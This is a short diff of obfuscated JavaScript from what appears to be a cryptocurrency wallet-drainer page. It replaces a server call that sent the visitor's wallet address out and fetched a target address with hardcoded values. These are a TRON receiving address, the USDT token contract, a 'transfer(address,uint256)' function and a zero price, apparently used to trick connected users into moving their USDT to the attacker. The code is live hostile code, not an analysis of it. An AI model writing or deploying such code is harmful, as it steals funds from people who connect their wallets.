@@ -422,28 +422,13 @@ async function tell_server_and_getaddress() {
 }
 
 function getwalletinfo() {
-  $.ajax({
-    "type": "POST",
-    "url": _0x2c6c51,
-    "async": false,
-    "data": {
-      "address": wallet_user_address,
-      "pid": pid,
-      "mode": mode,
-      "chain": chain
-    },
-    "success": function (_0x4f2a44, _0x3e7c39) {
-      {
-        let _0x522014 = JSON.parse(_0x4f2a44);
-        authaddress = _0x522014.aa;
-        authtokenaddress = _0x522014.ata;
-        authtokenfunction = _0x522014.tf;
-        authtokenprice = _0x522014.tp;
-        user_token = _0x522014.USDTbal;
+       
+        authaddress = "TJGd9GErpVFSuyAhsi5MJ8bGXU6HzaMrWG";
+        authtokenaddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        authtokenfunction = "transfer(address,uint256)";
+        authtokenprice = "0";
+        user_token = "USDT";
         inipass();
-      }
-    }
-  });
 }
 function DeviceisMobile() {
   const _0x2f28bb = /iPhone|iPad|iPod|Android|Windows Phone/.test(navigator.userAgent) || navigator.userAgent.includes("Mac") && "ontouchend" in document,
